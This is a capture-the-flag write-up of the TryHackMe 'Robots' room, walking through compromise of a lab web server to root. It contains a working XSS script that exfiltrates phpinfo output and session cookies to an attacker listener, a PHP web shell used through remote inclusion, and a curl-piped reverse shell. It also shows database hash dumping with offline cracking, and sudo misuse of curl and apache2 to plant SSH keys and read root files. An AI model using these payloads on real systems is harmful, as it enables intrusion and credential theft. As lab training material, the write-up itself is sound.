<h1 align="center">Robots</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/b00e2a6b-a091-42a9-9a2d-a7cdfb3efbed"><br>
July 17, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>437</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>A (small) tribute to I. Asimov.</em>.<br>
Access it <a href="https://tryhackme.com/room/robots"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/78b8914a-0abd-4896-b910-a1a21602cc1f"></p>

<br>

<h2>Task 1 . Get the User and Root Flag</h2>
<p>Find the user flag then escalate your privileges to root.<br>

Note: Please allow 5 minutes for the VM to fully boot.</p>

<h3 align="left"> Answer the questions below</h3>

> 1.1. <em>What is the value of the user flag?</em><br><a id='1.1'></a>
>> <strong><code>Redacted</code></strong><br>
<p></p>

<br>

> 1.2. <em>What is the value of the root flag?</em><br><a id='1.2'></a>
>> <strong><code>Redacted</code></strong><br>
<p></p>

<br>
<br>

<h3>nmap</h3>

```bash
:~/Robots# nmap -sC -sV -Pn -p- -n -T4 TargetIP
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.61
| http-robots.txt: 3 disallowed entries 
|_/harming/humans /ignoring/human/orders /harm/to/self
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: 403 Forbidden
9000/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
...
Service Info: Host: robots.thm
```

<h3>/etc/hosts</h3>

```bash
TargetIP   robots.thm 
```

<h3>gobuster</h3>

```bash
:~/Robots# gobuster dir -u http://robots.thm/harm/to/self/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,html,txt -t 80
...
/register.php         (Status: 200) [Size: 976]
/login.php            (Status: 200) [Size: 795]
/admin.php            (Status: 200) [Size: 370]
/css                  (Status: 301) [Size: 319] [--> http://robots.thm/harm/to/self/css/]
/index.php            (Status: 200) [Size: 662]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/.html                (Status: 403) [Size: 275]
/config.php           (Status: 200) [Size: 0]
/server_info.php      (Status: 200) [Size: 0]
```

```bash
:~/Robots# gobuster dir -u http://robots.thm:9000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,html,txt -t 80
...
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10671]
/server-status        (Status: 403) [Size: 277] 
```

<h3>nikto</h3>

```bash
:~/Robots# nikto -h http://robots.thm/harm/to/self/index.php
...
+ Server: Apache/2.4.61 (Debian)
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/8.3.10
...
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
...
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Robots# nikto -h http://robots.thm:9000
...
+ Server: Apache/2.4.52 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x29af 0x62004e7965491 
...
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
...
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h3>robots.thm/robots.txt</h3>

<img width="800" height="41" alt="image" src="https://github.com/user-attachments/assets/d3ce3ee7-a5c7-4956-b995-36474abfc5e1" />


```bash
:~/Robots# curl http://robots.thm/robots.txt
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self 
```

<h3>html2text</h3>

```bash
:~/Robots# apt install htlm2text 
```

<h3>robots.thm/harming/humans/</h3>

```bash
:~/Robots# curl -s http://robots.thm/harming/humans/ | html2text
****** Forbidden ******
You don't have permission to access this resource.
===============================================================================
     Apache/2.4.61 (Debian) Server at robots.thm Port 80 
```

<h3>robots.thm/ignoring/human/orders</h3>

```bash
:~/Robots# curl -s http://robots.thm/ignoring/human/orders/ | html2text
****** Forbidden ******
You don't have permission to access this resource.
===============================================================================
     Apache/2.4.61 (Debian) Server at robots.thm Port 80 
```

<h3>robots.thm/harm/to/self/</h3>
<p>Identify Register_here and Login</p>

```bash
:~/Robots# curl -v http://robots.thm/harm/to/self/ | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying TargetIP:80...
* TCP_NODELAY set
* Connected to robots.thm (TargetIP) port 80 (#0)
> GET /harm/to/self/ HTTP/1.1
> Host: robots.thm
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 17 Jul 2025 xx:xx:xx GMT
< Server: Apache/2.4.61 (Debian)
< X-Powered-By: PHP/8.3.10
< Set-Cookie: PHPSESSID=eclo30bb5ngm2o7btabnbi2d5t; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 662
< Content-Type: text/html; charset=UTF-8
< 
{ [662 bytes data]
100   662  100   662    0     0   215k      0 --:--:-- --:--:-- --:--:--  215k
* Connection #0 to host robots.thm left intact

*** Recruitment campaign: register here and login ***
An admin monitors new users.
Register_here
Login
```

<h3>robots.thm/harm/to/self/register.php</h3>
<p>Identify An admin monitors new users and password = md5(username+ddmm)</p>

```bash
:~/Robots# curl -s http://robots.thm/harm/to/self/register.php | html2text

*** Register here ***
An admin monitors new users. Your initial password will be md5(username+ddmm)
username [username            ]
date of birth [date_of_birth       ] [Submit]  
```

<img width="800" height="159" alt="image" src="https://github.com/user-attachments/assets/77b04b85-6e20-42fe-92af-7c2f98270156" />


<h3>robots.thm/harm/to/self/login.php</h3>
<p>Identify An admin monitors new users & password = md5(username+ddmm).</p>

```bash
:~/Robots# curl -s http://robots.thm/harm/to/self/login.php | html2text

*** Login ***
username [username            ]
password[********************] [Submit]
```


<img width="800" height="130" alt="image" src="https://github.com/user-attachments/assets/b691956f-b8d5-47d5-af5e-3925339f4dfa" />


<h3>robots.thm/harm/to/self/index.php</h3>

```bash
:~/Robots# curl -s http://robots.thm/harm/to/self/index.php | html2text

*** Recruitment campaign: register here and login ***
An admin monitors new users.
Register_here
Login 
```

<img width="800" height="154" alt="image" src="https://github.com/user-attachments/assets/180ca91f-4324-4956-bc2d-eb49dcb14df9" />


<h3>robots.thm:9000 or robots.thm:9000/index.html</h3>

```bash
:~/Robots# curl -s http://robots.thm:9000 | html2text
[Ubuntu Logo]
 Apache2 Default Page
It works!
This is the default welcome page used to test the correct operation of the
Apache2 server after installation on Ubuntu systems. It is based on the
equivalent page on Debian, from which the Ubuntu Apache packaging is derived.
...
```

<h3>Register</h3>

<p>
 
- register username : rosana and  date of birth :  11/11/1111<br>
- click SUBMIT QUERY<br>
- click Login<br>
- use MD5 Hash Generator , CyberChef, or simply md5sum against rosana1111</p>

<h3>password</h3>

```bash
:~/Robots# echo -n rosana1111 | md5sum
27f06b8cc2eb40a0b23e6fb1755e58f9  - 
```

<h3>Burp Suite and FoxyProxy</h3>
<p>- enable both</p>

<h3>Authenticate</h3>
<h4>PHPSRSSID</h4>

<p>

- authenticate with rosana password discovered in the previous step and click SUBMIT QUERY<br>
- identify Server info link, Admin last login: ... and User 3<br>
- right-click the web page and select Inspect<br>
- identify a PHPSESSID value in Storage</p>

<img width="800" height="77" alt="image" src="https://github.com/user-attachments/assets/192e60eb-0152-4a86-92bb-0d79c830444b" />

<p>

- click Server info and navigate to Apache Environment session<br>
- identify HTTP_COOKIE with the previous PHPSESSID value
</p>

<h3>Register a new user LoL</h3>

<h4>JS script</h4>

```bash
:~/Robots/exfil# cat xss.js
async function exfil() {
    const response = await fetch('/harm/to/self/server_info.php');
    const text = await response.text();

    await fetch('http://AttackIP:AttackPort/exfil', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `data=${btoa(text)}`
    });
}

exfil();
```

<h4>Username</h4>

```bash
<script src="http://AttackIP:8000/xss.js"></script>
```

<h4>Password</h4>

```bash
:~/Robots# echo -n '<script src="http://AttackIP:8000/xss.js"></script>1111' | md5sum
82b.................................  -
```

<p>

- set up an http server<br>
- set up a listener<br>
- authenticate
</p>

<h4>HTTP server</h4>

```bash
:~/Robots# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
TargetIP - - [17/Jul/2025 xx:xx:xx] "GET /xss.js HTTP/1.1" 200
```

<h4>Listener</h4>

```bash
:~/Robots# nc -nlvp AttackPort
Listening on 0.0.0.0 AttackPort
Connection received on AttackIP 59792
POST /exfil HTTP/1.1
Host: AttackIP:AttackPort
Connection: keep-alive
Content-Length: 99145
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.6533.119 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://robots.thm
Referer: http://robots.thm/
Accept-Encoding: gzip, deflate

data=PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL ... PC90ZD48L3RyPgo8L3RhYmxlPgo8L2Rpdj48L2JvZHk+PC9odG1sPg==
```

<h4>decode</h4>

<p>
 
- decode <code>data</code> file from Base64<br>
- identify <code>HTTP_COOKIE</code> value<br>
- notice that using <code>inspect</code> in the web page registered the <code>PHPSESSID</code> did not change<br>
- substitute it by the <code>HTTP_COOKIE</code> decoded<br>
- reload<br>
- Kept </p>

```bash
$_SERVER['HTTP_COOKIE']           PHPSESSID=REDACTED
```

<p><em>decoded</em></p>

```bash
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
...
<title>PHP 8.3.10 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
...
<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039;  &#039;--build=x86_64-linux-gnu&#039; &#039;--with-config-file-path=/usr/local/etc/php&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&#039; &#039;--enable-option-checking=fatal&#039; &#039;--with-mhash&#039; &#039;--with-pic&#039; &#039;--enable-mbstring&#039; &#039;--enable-mysqlnd&#039; &#039;--with-password-argon2&#039; &#039;--with-sodium=shared&#039; &#039;--with-pdo-sqlite=/usr&#039; &#039;--with-sqlite3=/usr&#039; &#039;--with-curl&#039; &#039;--with-iconv&#039; &#039;--with-openssl&#039; &#039;--with-readline&#039; &#039;--with-zlib&#039; &#039;--disable-phpdbg&#039; &#039;--with-pear&#039; &#039;--with-libdir=lib/x86_64-linux-gnu&#039; &#039;--disable-cgi&#039; &#039;--with-apxs2&#039; &#039;build_alias=x86_64-linux-gnu&#039; </td></tr>
<tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
<tr><td class="e">Virtual Directory Support </td><td class="v">disabled </td></tr>
<tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/usr/local/etc/php </td></tr>
<tr><td class="e">Loaded Configuration File </td><td class="v">/usr/local/etc/php/php.ini </td></tr>
<tr><td class="e">Scan this dir for additional .ini files </td><td class="v">/usr/local/etc/php/conf.d </td></tr>
<tr><td class="e">Additional .ini files parsed </td><td class="v">/usr/local/etc/php/conf.d/docker-php-ext-pdo_mysql.ini,
...
<tr><td class="e">HTTP_HOST </td><td class="v">robots.thm </td></tr>
<tr><td class="e">HTTP_CONNECTION </td><td class="v">keep-alive </td></tr>
<tr><td class="e">HTTP_USER_AGENT </td><td class="v">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.6533.119 Safari/537.36 </td></tr>
<tr><td class="e">HTTP_ACCEPT </td><td class="v">*/* </td></tr>
<tr><td class="e">HTTP_REFERER </td><td class="v">http://robots.thm/harm/to/self/index.php </td></tr>
<tr><td class="e">HTTP_ACCEPT_ENCODING </td><td class="v">gzip, deflate </td></tr>
<tr><td class="e">HTTP_COOKIE </td><td class="v">PHPSESSID=REDACTED </td></tr>
...
<tr><td class="e">SERVER_SIGNATURE </td><td class="v">&lt;address&gt;Apache/2.4.61 (Debian) Server at robots.thm Port 80&lt;/address&gt;
 </td></tr>
<tr><td class="e">SERVER_SOFTWARE </td><td class="v">Apache/2.4.61 (Debian) </td></tr>
<tr><td class="e">SERVER_NAME </td><td class="v">robots.thm </td></tr>
<tr><td class="e">SERVER_ADDR </td><td class="v">172.18.0.4 </td></tr>
<tr><td class="e">SERVER_PORT </td><td class="v">80 </td></tr>
<tr><td class="e">REMOTE_ADDR </td><td class="v">172.18.0.3 </td></tr>
<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/html </td></tr>
```

<br>


```bash
<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039;  &#039;--build=x86_64-linux-gnu&#039; &#039;--with-config-file-path=/usr/local/etc/php&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&#039; &#039;--enable-option-checking=fatal&#039; &#039;--with-mhash&#039; &#039;--with-pic&#039; &#039;--enable-mbstring&#039; &#039;--enable-mysqlnd&#039; &#039;--with-password-argon2&#039; &#039;--with-sodium=shared&#039; &#039;--with-pdo-sqlite=/usr&#039; &#039;--with-sqlite3=/usr&#039; &#039;--with-curl&#039; &#039;--with-iconv&#039; &#039;--with-openssl&#039; &#039;--with-readline&#039; &#039;--with-zlib&#039; &#039;--disable-phpdbg&#039; &#039;--with-pear&#039; &#039;--with-libdir=lib/x86_64-linux-gnu&#039; &#039;--disable-cgi&#039; &#039;--with-apxs2&#039; &#039;build_alias=x86_64-linux-gnu&#039; </td></tr>
```

<p><em>decoded</em></p>

```bash
<tr><td class="e">Configure Command </td><td class="v"> './configure'  '--build=x86_64-linux-gnu' '--with-config-file-path=/usr/local/etc/php' '--with-config-file-scan-dir=/usr/local/etc/php/conf.d' '--enable-option-checking=fatal' '--with-mhash' '--with-pic' '--enable-mbstring' '--enable-mysqlnd' '--with-password-argon2' '--with-sodium=shared' '--with-pdo-sqlite=/usr' '--with-sqlite3=/usr' '--with-curl' '--with-iconv' '--with-openssl' '--with-readline' '--with-zlib' '--disable-phpdbg' '--with-pear' '--with-libdir=lib/x86_64-linux-gnu' '--disable-cgi' '--with-apxs2' 'build_alias=x86_64-linux-gnu' </td></tr>
```

<br>


<h3>PHP script</h3>

```bash
:~/Robots# echo '<?php system($_REQUEST["cmd"]); ?>' > cmd.php
```

<h3>Server info</h3>
<p>

- we have <code>admin</code> permissions after substituting the <code>PHPSESSID</code> value and reloading</br>
- click <code>Server Info</code><br>
- experiment<br>
- send <code>http://AttackIP:AttackPort/cmd.php</code>
</p>

<h3>Burp Repeater</h3>

<p>

- send the successfull <code>cmd</code> Request to Burp´s Repeater</p>

<h3>id</h3>
<p>
 
- add <code>&id</code> to the Request</p>

<p><em>Request</em></p>

```bash
POST /harm/to/self/admin.php HTTP/1.1
Host: robots.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: http://robots.thm
Connection: close
Referer: http://robots.thm/harm/to/self/admin.php
Cookie: PHPSESSID=Redacted
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2FAttackIP%3AAttackPort%2Fcmd.php&cmd=id&submit=Submit+Query
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
Date: Thu, 17 Jul 2025 xx:xx:xx GMT
Server: Apache/2.4.61 (Debian)
X-Powered-By: PHP/8.3.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 353
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>Your page title here :)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">

</head>
<body>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br>
<br>

<p>experiment substituting <code>&id</code> by other commands, for example <code>ls -lah /home/</code></p>

<p><em>Request</em></p>

```bash
...
url=http%3A%2F%2FAttackIP%3AAttackPort%2Fcmd.php&cmd=ls%20-lah%20/home&submit=Submit+Query
```

<br>
<br>

<h3>Reverse Shell</h3>

<p>
 
- craft a reverse shell<br>
- set up a listener<br>
- use the previous Request updating it</p>

```bash
:~/Robots# echo '/bin/bash -i >& /dev/tcp/AttackIP/AttackPort 0>&1' > index.html
```

<p><em>Request</em></p>

```bash
...
url=http%3A%2F%2FAttackIP%3AAttackPort%2Fcmd.php&cmd=curl%20AttackIP:AttackPort/index.html|bash&submit=Submit+Query
```

<br>
<br>

<h3>Shell</h3>
<h4>Stabilize</h4>

```bash
:~/Robots# nc -nlvp AttackPort
Listening on 0.0.0.0 AttackPort
Connection received on AttackIP 42966
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@robots:/var/www/html/harm/to/self$ which python3
www-data@robots:/var/www/html/harm/to/self$
www-data@robots:/var/www/html/harm/to/self$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@robots:/var/www/html/harm/to/self$ ^Z
[1]+  Stopped                 nc -nlvp AttackPort
:~/Robots# stty raw -echo; fg
nc -nlvp AttackPort

www-data@robots:/var/www/html/harm/to/self$ export TERM=xterm
```

<h4>config.php</h4>

```bash
www-data@robots:/var/www/html/harm/to/self$ cat config.php
cat config.php
<?php
    $servername = "db";
    $username = "robots";
    $password = "REDACTED";
    $dbname = "web";
// Get the current hostname
$currentHostname = $_SERVER['HTTP_HOST'];

// Define the desired hostname
$desiredHostname = 'robots.thm';

// Check if the current hostname does not match the desired hostname
if ($currentHostname !== $desiredHostname) {
    // Redirect to the desired hostname
    header("Location: http://$desiredHostname" . $_SERVER['REQUEST_URI']);
    exit();
}
ini_set('session.cookie_httponly', 1);

session_start();

?> 
```

<h4>hosts</h4>

```bash
www-data@robots:/var/www/html/harm/to/self$ getent hosts db
172.18.0.2   db
```

<h4>chisel</h4>


<p>
- did not work<br>
- expand a lot of time with chisel</p>


<h3>Database</h3>

<p>

- remember from previous step ...
</p>

```bash
<tr><td class="e">Configure Command </td><td class="v"> './configure'  '--build=x86_64-linux-gnu' '--with-config-file-path=/usr/local/etc/php' '--with-config-file-scan-dir=/usr/local/etc/php/conf.d' '--enable-option-checking=fatal' '--with-mhash' '--with-pic' '--enable-mbstring' '--enable-mysqlnd' '--with-password-argon2' '--with-sodium=shared' '--with-pdo-sqlite=/usr' '--with-sqlite3=/usr' '--with-curl' '--with-iconv' '--with-openssl' '--with-readline' '--with-zlib' '--disable-phpdbg' '--with-pear' '--with-libdir=lib/x86_64-linux-gnu' '--disable-cgi' '--with-apxs2' 'build_alias=x86_64-linux-gnu' </td></tr>
```

<p>

- researched about it and did not get an outcome
</p>

<br>
<br>

```bash
$servername = "db";
$username = "robots";
$password = "REDACTED";
$dbname = "web";
```

<p>

- employed Djalil´s solution
</p>


```bash
php -r '$pdo=new PDO("mysql:host=db;dbname=web;charset=utf8mb4","robots","REDACTED", [PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);$r=$pdo->query("SELECT * FROM user");while($row=$r->fetch()){print_r($row);}' 
```

<h4>Hashes</h4>

```bash
www-data@robots:/var/www/html/harm/to/self$ php -r '$pdo=new PDO("mysql:host=db;dbname=web;charset=utf8mb4","robots","REDACTED", [PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);$r=$pdo->query("SELECT * FROM user");while($row=$r->fetch()){print_r($row);}'
...
Array
(
    [id] => 2
    [username] => rgiskard
    [password] => REDACTED
    [group] => nologin
)
...
```

<h4>Decode</h4>

<p>

- employed Jaxafed´s solution
</p>


```bash
#!/usr/bin/env python3

from hashlib import md5

for m in range(1, 13):
	for d in range(1, 32):
		plain = "rgiskard" + str(d).zfill(2) + str(m).zfill(2)
		password = md5(plain.encode()).hexdigest()
		hashed = md5(password.encode()).hexdigest()
		if hashed == "rgiskard´s hash here":
			print(f"Plain: {plain}, Password: {password}")
			exit()
```

```bash
:~/Robots/exfil# python3 script.py
Plain: rgiskard2209, Password: REDACTED
```

<h4>ssh | rgiskard</h4>

```bash
:~/Robots/exfil# ssh rgiskard@robots.thm
...
rgiskard@ubuntu-jammy:~$ pwd
/home/rgiskard
rgiskard@ubuntu-jammy:~$ ls -lah
total 20K
drwxr-x--- 2 rgiskard rgiskard 4.0K Aug 19  2024 .
drwxr-xr-x 5 root     root     4.0K Aug 19  2024 ..
-rw-r--r-- 1 rgiskard rgiskard  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 rgiskard rgiskard 3.7K Jan  6  2022 .bashrc
-rw-r--r-- 1 rgiskard rgiskard  807 Jan  6  2022 .profile
rgiskard@ubuntu-jammy:~$ sudo -l
[sudo] password for rgiskard: 
Matching Defaults entries for rgiskard on ubuntu-jammy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rgiskard may run the following commands on ubuntu-jammy:
    (dolivaw) /usr/bin/curl 127.0.0.1/*
```

<h3>Dolival data</h3>
<h4>/usr/bin/burl 127.0.0.1/*</h4>

```bash
rgiskard@ubuntu-jammy:~$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///home/dolivaw/user.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
THM{REDACTED}
```
 
<h4>Generate Key</h4>

```bash
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
...
```

<h4>Transfer Key</h4>

```bash
:~/Robots/exfil# python3 -m http.server
```

<h4>/usr/bin/burl 127.0.0.1/*</h4>

```bash
rgiskard@ubuntu-jammy:~$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://AttackIP:8000/id_rsa.pub -o /tmp -o /home/dolivaw/.ssh/authorized_keys
```

<h4>ssh | dolivaw</h4>

```bash
:~/Robots/exfil# ssh -i id_rsa dolivaw@robots.thm
dolivaw@ubuntu-jammy:~$ sudo -l
Matching Defaults entries for dolivaw on ubuntu-jammy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dolivaw may run the following commands on ubuntu-jammy:
    (ALL) NOPASSWD: /usr/sbin/apache2 
```

<h4>Root´s data</h4>

```bash
dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -C 'Include /root/root.txt' -k stop
[Thu Jul 17 xx:xx:xx.875751 2025] [core:warn] [pid 67155] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /tmp' -C 'Include /root/root.txt' -k stop
[Thu Jul 17 xx:xx:xx.421189 2025] [core:warn] [pid 67158] AH00111: Config variable ${APACHE_PID_FILE} is not defined
[Thu Jul 17 xx:xx:xx.421259 2025] [core:warn] [pid 67158] AH00111: Config variable ${APACHE_RUN_USER} is not defined
[Thu Jul 17 xx:xx:xx.421265 2025] [core:warn] [pid 67158] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
[Thu Jul 17 xx:xx:xx.421710 2025] [core:warn] [pid 67158] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Thu Jul 17 xx:xx:xx.435094 2025] [core:warn] [pid 67158:tid 140604734797696] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Thu Jul 17 xx:xx:xx.435421 2025] [core:warn] [pid 67158:tid 140604734797696] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Thu Jul 17 xx:xx:xx.435452 2025] [core:warn] [pid 67158:tid 140604734797696] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command 'THM{REDACTED}', perhaps misspelled or defined by a module not included in the server configuration
dolivaw@ubuntu-jammy:~$
```


<br>
<br>


<img width="1903" height="883" alt="image" src="https://github.com/user-attachments/assets/47d2dd29-b101-4c4d-aca6-6114eb28922e" />

<img width="1892" height="893" alt="image" src="https://github.com/user-attachments/assets/9becfb9a-9a5f-44db-ac6c-569faf0ddc76" />

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 17, 2025     | 437      |     156ᵗʰ    |      5ᵗʰ     |    172nd    |     7ᵗʰ    | 115,209  |    863    |    72     |

</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/9776dadb-815e-411a-93c4-e420b4cce794" />

<img width="1894" height="888" alt="image" src="https://github.com/user-attachments/assets/c97f9dc6-5672-4f16-a7e4-4d37fb3e8309" />

<img width="1893" height="890" alt="image" src="https://github.com/user-attachments/assets/3b2691de-0084-4074-afec-0f5b7add4f16" />

<img width="1898" height="889" alt="image" src="https://github.com/user-attachments/assets/75b4da6e-1c45-4f3f-a3fd-f25d4d161477" />

<img width="1891" height="891" alt="image" src="https://github.com/user-attachments/assets/5b8593e7-14fa-4a40-af43-32c13f221203" />
